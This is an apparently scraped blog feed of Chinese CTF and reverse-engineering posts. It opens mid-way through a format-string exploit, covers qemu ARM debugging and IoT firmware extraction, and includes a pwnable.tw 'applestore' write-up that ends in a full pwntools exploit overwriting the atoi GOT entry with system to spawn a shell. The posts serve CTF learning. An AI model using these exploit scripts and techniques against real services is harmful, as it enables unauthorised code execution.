class="line">log.info(<span class="string">"ebp address is %x"</span> % addr_stack_ebp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ebp_low_four = addr_stack_ebp &amp; 0xffff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># variable MACRO_COUNT address's low four bytes</span></span><br><span class="line">count_low_four = (addr_stack_ebp + <span class="number">0x17</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"%"</span> + str(count_low_four) + <span class="string">"d"</span> + <span class="string">"%9$hn"</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvrepeat(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"%255d%57$hhn"</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvrepeat(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">####### No problem up ##############################</span></span><br><span class="line"></span><br><span class="line">puts_got_run = puts_got + binary_base</span><br><span class="line">modify(addr_stack_ebp + <span class="number">0x20</span>, puts_got_run)</span><br><span class="line"></span><br><span class="line">p.recvrepeat(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#leak the strncmp address</span></span><br><span class="line">payload7 = <span class="string">"%14$s"</span></span><br><span class="line">p.sendline(payload7)</span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">puts_address = u32(p.recvline()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">log.info(<span class="string">"puts address is %x "</span> % puts_address)</span><br><span class="line">libc_base = puts_address - puts_offset</span><br><span class="line">log.info(<span class="string">"libc base address is %x"</span> % libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#############leak libc address done ############</span></span><br><span class="line"></span><br><span class="line">ret_address = addr_stack_ebp + <span class="number">0x34</span></span><br><span class="line">arg_address = addr_stack_ebp + <span class="number">0x3c</span></span><br><span class="line"></span><br><span class="line">system_address = system_offset + libc_base</span><br><span class="line">bin_sh_address = bin_sh_offset + libc_base</span><br><span class="line"></span><br><span class="line">modify(ret_address, system_address)</span><br><span class="line">modify(arg_address, bin_sh_address)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">p.recvrepeat(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#p.sendline('EXIT')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li>ctf-wiki:格式化字符串漏洞原理介绍: <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/</a></li>
<li>lib database search: <a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这两天做了一个CTF的题目，该题目的二进制&lt;a href=&quot;./babyformat&quot;&gt;链接&lt;/a&gt;。该题目的逻辑非常简单，就是接受输入，并
    
    </summary>
    
      <category term="ctf" scheme="http://bin2415.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://bin2415.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Intel linux调试arm程序</title>
    <link href="http://bin2415.github.io/2018/07/26/qemu-arm/"/>
    <id>http://bin2415.github.io/2018/07/26/qemu-arm/</id>
    <published>2018-07-26T06:43:55.000Z</published>
    <updated>2018-12-23T05:33:53.026Z</updated>
    
    <content type="html"><![CDATA[<h3 id="安装qemu"><a href="#安装qemu" class="headerlink" title="安装qemu"></a>安装qemu</h3><ul>
<li>sudo apt-get install qemu</li>
</ul>
<h3 id="安装arm文件所需要的动态库"><a href="#安装arm文件所需要的动态库" class="headerlink" title="安装arm文件所需要的动态库"></a>安装arm文件所需要的动态库</h3><ul>
<li>sudo apt-get install gcc-multilib-arm-linux-gnueabi</li>
<li>sudo apt-get install gcc-armhf-cross</li>
<li>此时在/usr/arm-linux-gnueabihf/lib/文件夹中会有安装的这些库，有的arm文件在动态链接的时候是直接指向的/lib/ld-linux-armhf.so.3文件的，所以此时需要将/usr/arm-linux-gnueabihf/lib/ld-linux-armhf.so.3软连接到/lib/文件夹下: ln -s /usr/arm-linux-gnueabihf/lib/ld-linux-armhf.so.3 /lib/ld-linux-armhf.so.3</li>
</ul>
<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ul>
<li>在运行前添加/usr/arm-linux-gnueabihf/lib文件夹到LD_LIBRARY_PATH环境变量里面: export LD_LIBRARY_PATH=/usr/arm-linux-gnueabihf/lib/:$LD_LIBRARY_PATH</li>
<li>qemu-arm运行arm程序: qemu-arm -g 1234 /path/of/arm-executable, 即在1234端口上开启调试模式</li>
</ul>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><ul>
<li>此时就可以在自己机器上进行调试改程序，既可以使用IDA pro进行远端调试，也可以使用gdb进行调试，此处介绍gdb调试</li>
<li>在调试前请确保自己安装了gdb-multiarch，如果没有安装，则 sudo apt install gdb-multiarch</li>
<li>用gdb打开待调试文件: <code>gdb-multiarch /path/of/arm-executable</code></li>
<li>在gdb中连接调试端口: <code>target remote 1234</code>，调试即可</li>
</ul>
<p>Enjoy it!!!</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;安装qemu&quot;&gt;&lt;a href=&quot;#安装qemu&quot; class=&quot;headerlink&quot; title=&quot;安装qemu&quot;&gt;&lt;/a&gt;安装qemu&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;sudo apt-get install qemu&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;安装a
    
    </summary>
    
      <category term="qemu" scheme="http://bin2415.github.io/categories/qemu/"/>
    
    
      <category term="arm" scheme="http://bin2415.github.io/tags/arm/"/>
    
      <category term="qemu" scheme="http://bin2415.github.io/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>IoT firmware逆向之入门篇</title>
    <link href="http://bin2415.github.io/2018/07/10/firmware-reverse/"/>
    <id>http://bin2415.github.io/2018/07/10/firmware-reverse/</id>
    <published>2018-07-10T12:52:27.000Z</published>
    <updated>2018-12-23T05:33:53.001Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着IoT(Internet of Things)设备快速增长，IoT设备的安全也逐渐引起大家的注意。如论文[1]所述，IoT的安全问题主要包括如下方面:</p>
<ul>
<li>感知层安全。IoT的感知层主要包括wireless sensor networks, RFID, 802.11, BLE(Bluetooth low energy), zigbee and etc. 这些通信网络本身可能会存在一些安全问题。</li>
<li>网络层安全。IoT的网络层安全主要包括通信协议的安全，隐私泄露等问题。</li>
<li>应用层安全。应用层安全主要包括软件安全，认证问题，隐私数据的保护，认证和校验的问题。</li>
</ul>
<p>它们的关系如下图所示：</p>
<p><img src="/2018/07/10/firmware-reverse/./security_landscape.png" alt="security_landscape"></p>
<p>图1 IoT安全概览</p>
<p>由于IoT设备对于能耗和及时性的要求比较高，所以其具体实现(操作系统及软件的保护机制)都和PC端和手机端有很大的区别。由于能耗的要求，大部分IoT设备都采用低能耗的处理器(比如arm Contex-M系列)，这些处理器大部分都没有MMU，所以没有虚拟地址到物理地址的转换，更无法提供ASLR等防护(arm Contex-M由于有MPU功能，能提供比较局限的内存防护机制)；由于实时性的要求，大部分采用的系统是RTOS(Real Time Operating System)或者直接是bare mental system，其每个设备的内存布局可能都是固定的。所以IoT设备的应用层的安全也是非常严峻的。</p>
<h2 id="Firmware"><a href="#Firmware" class="headerlink" title="Firmware"></a>Firmware</h2><p>在IoT设备中，其代码和数据一般存储在ROM中(大部分都是Flash，关于Flash的种类可以访问<a href="https://www.jianshu.com/p/ea84db15c1fa" target="_blank" rel="noopener">here</a>来了解一下)。一般将这部分代码和数据称为Firmware(可能表述不准确，欢迎指正)。Firmware没有一个固定的格式，它更像是一个binary blob，具体的格式和解析根据设备的不同而有所不同。</p>
<p>一般获取firmware的方式主要有三种:</p>
<ul>
<li>从厂商官网下载或者逆向厂商的App获得</li>
<li>劫持(中间人攻击)firmware更新过程</li>
<li>硬件逆向，直接读取存放firmware的flash或者UART串口调试</li>
</ul>
<p>由于现在有很多IoT设备都是Over-The-Air Firmware Update，所以有很多厂商并不会在官网上提供firmware的下载，所以一般比较通用的获取firmware的方法都是通过硬件逆向方法。关于硬件逆向，推荐两篇文章<a href="https://future-sec.com/iot-security-hardware-obtain.html" target="_blank" rel="noopener">物联网硬件安全分析基础-固件提取</a>和<a href="https://future-sec.com/iot-security-hardware-debuging.html" target="_blank" rel="noopener">物联网硬件安全分析基础-串口调试</a>。</p>
<h3 id="逆向Firmware"><a href="#逆向Firmware" class="headerlink" title="逆向Firmware"></a>逆向Firmware</h3><p>最近在查看关于firmware逆向有关的资料，发现有如下几个问题:</p>
<ul>
<li>不知道哪些是代码段和数据段</li>
<li>不知道内存布局，即不知道firmware的基址</li>
<li>……</li>
</ul>
<p>在浏览了很多教程之后，发现了关于<a href="http://marvell-iot.github.io/" target="_blank" rel="noopener">Marvell IoT SDK</a>的一些小经验，特总结下来，以备日后查阅。具体的教程可参阅<a href="https://hackernoon.com/inside-the-bulb-adventures-in-reverse-engineering-smart-bulb-firmware-1b81ce2694a6" target="_blank" rel="noopener">Inside The Bulb: Adventures in Reverse Engineering Smart Bulb Firmware</a>和<a href="https://github.com/dgiese/dustcloud" target="_blank" rel="noopener">dustcloud</a>。dustcloud做了挺多关于小米iot逆向的工作的，其中小米的yeelight和智能网管设备的firmware都是采用的Marvell IoT SDK。由于dustcloud直接提供了yeelight的firmware，所以就省去了我硬件逆向提取firmware的步骤了，我直接从<a href="https://github.com/dgiese/dustcloud/tree/master/devices/yeelink.light.strip1/Firmware/140.34" target="_blank" rel="noopener">dustcloud</a>下载firmware。</p>
<p><a href="https://hackernoon.com/inside-the-bulb-adventures-in-reverse-engineering-smart-bulb-firmware-1b81ce2694a6" target="_blank" rel="noopener">Inside The Bulb: Adventures in Reverse Engineering Smart Bulb Firmware</a>介绍了如何将Marvell IoT SDK格式的firmware提取出代码，并将其合并成elf文件的，由于里面细节有限，我在此重复了里面的步骤，并总结出了一些方法。</p>
<p>首先在二进制编辑器中可以看到该firmware是MRVL(Marvell)的，而该文件含有一些entries, 表示了不同”段”的偏移，大小和地址信息:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD magic;     <span class="comment">// Always 0x2</span></span><br><span class="line">DWORD offset;    <span class="comment">// Offset into the file</span></span><br><span class="line">DWORD size;      <span class="comment">// Size of the section</span></span><br><span class="line">DWORD address;   <span class="comment">// Memory address where this section will be loaded</span></span><br><span class="line">DWORD unknown;   <span class="comment">// Probably some kind of checksum?</span></span><br></pre></td></tr></table></figure>
<p>具体的firmware二进制数据如下图所示:</p>
<p><img src="/2018/07/10/firmware-reverse/./entry_example.png" alt="entry_example"></p>
<p>图2 firmware二进制</p>
<p>可知其含有三个不同的entry，可使用dd工具将这三个不同的”段”提取出来:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dd if=yeelink.light.strip1.bin bs=1 skip=200 count=12824 of=s1.bin</span><br><span class="line">dd if=yeelink.light.strip1.bin bs=1 skip=13024 count=299984 of=s2.bin</span><br><span class="line">dd if=yeelink.light.strip1.bin bs=1 skip=313008 count=5420 of=s3.bin</span><br></pre></td></tr></table></figure>
<p>此时，得到了三个二进制文件，使用arm-none-eabi-objcopy将其合并成ELF文件:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arm-none-eabi-objcopy -I binary -O elf32-littlearm --adjust-vma 0x100000 --binary-architecture arm --rename-section .data=.text,contents,alloc,load,readonly,code --add-section .text2=s2.bin --set-section-flags .text2=contents,alloc,load,readonly,code --change-section-address .text2=0x1f0032e0 --add-section .text3=s3.bin --set-section-flags .text3=contents,alloc,load,readonly,code --change-section-address .text3=0x20000040 s1.bin firmware_yeelink.elf</span><br></pre></td></tr></table></figure>
<p>上面的命令就是将三个文件合并成一个ELF文件，并且分别将其置为不同的section，设置virtual address。</p>
<p>如果直接将生成的文件firmware_yeelink.elf扔到IDA pro中会出现一个问题：由于objcopy生成的elf文件是可重定位类型(relocatable file)，扔到IDA中虚拟地址是从0开始的，并不是从0x100000开始的。</p>
<p>我最后终于找到一个方法：再使用ld链接器将可重定位类型的文件生成可执行类型(executable file)，并给每一个section添加虚拟地址:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arm-none-eabi-ld --section-start=.text=0x100000 --section-start=.text2=0x1f0032e0 --section-start=.text3=0x20000040 firmware_yeelink.elf -o firmware.elf</span><br></pre></td></tr></table></figure>
<p>此时扔给IDA，虚拟地址正确.</p>
<p><img src="/2018/07/10/firmware-reverse/./IDA_result.png" alt="ida_result"></p>
<p>（–未完待更–）</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ul>
<li>[1] Mendez, Diego M., Ioannis Papapanagiotou, and Baijian Yang. “Internet of things: Survey on security and privacy.” arXiv preprint arXiv:1707.01879 (2017).</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;随着IoT(Internet of Things)设备快速增长，IoT设备的安全也逐渐引起大家的注意。如论文[1]所述，IoT的安全问题主要
    
    </summary>
    
      <category term="iot" scheme="http://bin2415.github.io/categories/iot/"/>
    
    
      <category term="iot firmware" scheme="http://bin2415.github.io/tags/iot-firmware/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw之applestore</title>
    <link href="http://bin2415.github.io/2018/07/01/pwnable-tw/"/>
    <id>http://bin2415.github.io/2018/07/01/pwnable-tw/</id>
    <published>2018-07-01T08:50:23.000Z</published>
    <updated>2018-12-23T05:33:53.023Z</updated>
    
    <content type="html"><![CDATA[<p>该题是模拟了apple的商店，来售卖apple的各种产品，其提供了6个功能:</p>
<ul>
<li>1: 展示商店的商品</li>
<li>2: 添加商品到购物车</li>
<li>3: 从购物车里面将某一商品删除</li>
<li>4: 展示购物车里面的商品</li>
<li>5: 结算</li>
<li>6: 退出</li>
</ul>
<p>其中，购物车是用双向链表实现的，其每一项的结构如下，其在32位机器下的大小为16字节。链表头是一个全局变量，存在0x804b068处。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cart_entry</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* product_name,</span><br><span class="line">    <span class="keyword">int</span> price,</span><br><span class="line">    cart_entry* next,</span><br><span class="line">    cart_entry* previous</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>下面简单的分析添加，删除，购物车输出和结算功能。</p>
<h3 id="添加商品"><a href="#添加商品" class="headerlink" title="添加商品"></a>添加商品</h3><p>添加商品是在add()函数中实现的，其在ida中反汇编出来的结果如下图所示：</p>
<p><img src="/2018/07/01/pwnable-tw/./add_all.png" alt="add_all"></p>
<p>该函数的逻辑也比较简单，其首先通过malloc在堆上分配16自己大小的空间，然后进行初始化，最后将该结构体添加到双向链表中。</p>
<h3 id="结算"><a href="#结算" class="headerlink" title="结算"></a>结算</h3><p>结算功能是在checkout()函数中实现的，其在ida中反汇编出来的结果如下图所示:</p>
<p><img src="/2018/07/01/pwnable-tw/./checkout.png" alt="checkout"></p>
<p>由上图可知，其当满足总金额=7174时，则将一个临时变量v2(位于ebp-0x20)加入到双向链表中，而ebp-0x20处的内存如果能被我们所控制的话就可能进行攻击(泄露内存等)。而通过分析可知在cart()函数接收输入的时候我们的输入是能够覆盖到ebp-0x20处的。所以此时只需要满足购物车的总金额=7174即可。我们观察到一共有4种不同的价格(199,299,399,499),我们可以列个方程求出多种解。最直接的方法是交给<a href="https://github.com/Z3Prover/z3" target="_blank" rel="noopener">z3</a>求解器，具体求解如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">In [<span class="number">2</span>]: x = Int(<span class="string">'x'</span>)</span><br><span class="line">In [<span class="number">3</span>]: y = Int(<span class="string">'y'</span>)</span><br><span class="line">In [<span class="number">4</span>]: m = Int(<span class="string">'m'</span>)</span><br><span class="line">In [<span class="number">5</span>]: n = Int(<span class="string">'n'</span>)</span><br><span class="line">In [<span class="number">7</span>]: solve(x&gt;=<span class="number">0</span>,y&gt;=<span class="number">0</span>,m&gt;=<span class="number">0</span>,n&gt;=<span class="number">0</span>,<span class="number">199</span>*x+<span class="number">299</span>*y+<span class="number">399</span>*m+<span class="number">499</span>*n==<span class="number">7174</span>)</span><br><span class="line">[y = <span class="number">20</span>, x = <span class="number">6</span>, n = <span class="number">0</span>, m = <span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p>即可求出结果，使得满足购物车总金额=7174.</p>
<h3 id="输出购物车"><a href="#输出购物车" class="headerlink" title="输出购物车"></a>输出购物车</h3><p>输出购物车功能是在cart()函数中实现的，其在ida中反汇编出来的结果如下图所示：</p>
<p><img src="/2018/07/01/pwnable-tw/./cart.png" alt="cart"></p>
<p>在cart()函数中，有一个可以利用的地方就是在my_read()时，用户能输入0x15大小的数据，而输入的数据存进的内存即在ebp-0x22开始处，正好可以将checkout中的添加到双向链表的临时变量(ebp-0x20)给覆盖掉。如果我们将临时变量的第一个元素(存放商品名称)的地方存入atoi的got地址，则可以将libc的地址泄露出来。</p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>删除功能是在delete()函数中实现的，其在ida中反汇编出来的结果如下图所示:</p>
<p><img src="/2018/07/01/pwnable-tw/./pwnable-tw/delete.png" alt="delete"></p>
<p>删除操作就是在双向链表中找到要删除的项，然后就是正规的双向链表操作。由于我们可以通过输入控制ebp-0x20处的项的数据，如果我们将next和previous元素修改成特定的值，就有可能修改got表项，此时就造成了控制流的劫持。一开始我是将next修改成got[‘atoi’]-0xc，将previous改成system的地址，最后发生segment fault. 仔细一想，此时确实将atoi的got表项改成了system的地址了，但是也需要将system.addr+8赋值为got[‘atoi’]-0xc，而system.addr+8处是代码段，改程序又开了NX保护，所以会发生segment fault.</p>
<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>通过前面的分析，我们可以利用cart()函数覆盖ebp-0x20处的内容，进而可以进行内存泄露攻击，将glibc的地址和栈中的地址泄露出来。通过delete函数，我们可以修改某一内存处的内容，如果我们修改ebp的值，使其在leave操作(mov esp, ebp; pop ebp)时，将修改后的ebp值赋给ebp寄存器，从而控制栈，进而修改got表项。</p>
<h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><p>通过前面的分析我们可以看到在cart()函数中，如果将ebp-0x20处的内容覆盖为got[‘atoi’]的地址，则在cart函数输出的时候，就可以将atoi的got表项的内容泄露出来，即glibc的atoi函数的地址。</p>
<p>泄露栈中的地址，一开始没有思路，通过网上的write up，学到了一个方法：glibc有一个全局变量’environ’,该变量保存用户环境，其是一个char**类型，在程序运行时，将用户环境指向栈上，所以environ存储的地址就是栈上的地址，如果我们将environ变量的内容泄露出来也就泄露出来了栈上的地址。</p>
<h3 id="修改Got"><a href="#修改Got" class="headerlink" title="修改Got"></a>修改Got</h3><p>此前尝试直接将atoi的got表项改为system的地址会失败，通过查找write up发现有一个比较巧妙的方法: 通过修改子函数(delete函数)的saved ebp值为got[‘atoi’]+0x22的值，则返回delete函数到handle函数时，此时ebp即是got[‘atoi’]+0x22，此时通过my_read()函数将用户输入的值放入ebp-0x22处，即got[‘atoi’]，此时可以达到修改atoi的got表项的目的。而修改saved ebp值可以通过delete函数来实现。</p>
<h3 id="完整攻击"><a href="#完整攻击" class="headerlink" title="完整攻击"></a>完整攻击</h3><p>完整攻击代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">control ebp to control the stack, so can modify atoi got</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addDevice</span><span class="params">(device_num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Device Number&gt;'</span>)</span><br><span class="line">    p.sendline(device_num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(y/n) &gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cart</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(y/n) &gt;'</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Item Number&gt;'</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#p = process('./applestore', env=&#123;'LD_PRELOAD' : './libc_32.so.6'&#125;)</span></span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10104</span>)</span><br><span class="line">    apple = ELF(<span class="string">'./applestore'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">    <span class="comment">#print("pid : " + str(proc.pidof(p)))</span></span><br><span class="line">    <span class="comment">#raw_input('attach me ')</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">        addDevice(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        addDevice(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    checkout()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc address</span></span><br><span class="line">    payload = <span class="string">'y\x00'</span> + p32(apple.got[<span class="string">'atoi'</span>]) + <span class="string">'\x00\x00\x00\x00'</span> * <span class="number">3</span></span><br><span class="line">    <span class="comment">#addDevice(payload)</span></span><br><span class="line">    cart(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">    atoi_addr = u32(p.recvline()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    atoi_libc = libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">    libc_base = atoi_addr - atoi_libc</span><br><span class="line">    log.info(<span class="string">'atoi address is '</span> + hex(atoi_addr))</span><br><span class="line">    log.info(<span class="string">'atoi address in libc is '</span> + hex(atoi_libc))</span><br><span class="line">    log.info(<span class="string">'libc base address is '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    libc.address = libc_base</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the stack address</span></span><br><span class="line">    environ_addr = libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line">    payload = <span class="string">'y\x00'</span> + p32(environ_addr) + <span class="string">'\x00\x00\x00\x00'</span> * <span class="number">3</span></span><br><span class="line">    cart(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">    environ_addr = u32(p.recvline()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    log.info(<span class="string">'environ address is '</span> + hex(environ_addr))</span><br><span class="line">    ebp_address = environ_addr - <span class="number">0x104</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># delete, write the ebp to the atoi+0x22</span></span><br><span class="line">    payload = <span class="string">'27'</span> + p32(<span class="number">0x08049002</span>) + p32(<span class="number">0</span>) + p32(apple.got[<span class="string">'atoi'</span>] + <span class="number">0x22</span>) + p32(ebp_address - <span class="number">0x8</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p, '''</span></span><br><span class="line">    <span class="comment"># break *0x8048a3d</span></span><br><span class="line">    <span class="comment"># ''')</span></span><br><span class="line">    delete(payload)</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="comment"># attack, set the atoi got to system addr, and execute the system('/bin/sh')</span></span><br><span class="line">    payload = p32(libc.symbols[<span class="string">'system'</span>]) + <span class="string">';/bin/sh\x00'</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;该题是模拟了apple的商店，来售卖apple的各种产品，其提供了6个功能:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1: 展示商店的商品&lt;/li&gt;
&lt;li&gt;2: 添加商品到购物车&lt;/li&gt;
&lt;li&gt;3: 从购物车里面将某一商品删除&lt;/li&gt;
&lt;li&gt;4: 展示购物车里面的商品&lt;/li&gt;
    
    </summary>
    
      <category term="pwnable" scheme="http://bin2415.github.io/categories/pwnable/"/>
    
    
      <category term="pwnable" scheme="http://bin2415.github.io/tags/pwnable/"/>
    
  </entry>
  
  <entry>
    <title>gdb无法找到main</title>
    <link href="http://bin2415.github.io/2018/01/22/gdb%E6%97%A0%E6%B3%95%E5%AE%9A%E4%BD%8Dmain/"/>
    <id>http://bin2415.github.io/2018/01/22/gdb无法定位main/</id>
    <published>2018-01-22T11:01:10.000Z</published>
    <updated>2018-12-23T05:33:53.011Z</updated>
    
    <content type="html"><![CDATA[<p>最近在用gdb调试一个程序的时候，由于程序经过了strip处理，没有debug信息，所以当b main的时候会出现”Function main not defined”错误信息，也就是无法定位main函数。而当b <strong>libc_start_main函数时是可以定位到的，而</strong>libc_start_main函数的第一个参数就是main函数的地址，因此可以通过定位__libc_start_main函数，然后获得第一个参数的内容，此时就是main函数的地址。具体操作如下：</p>
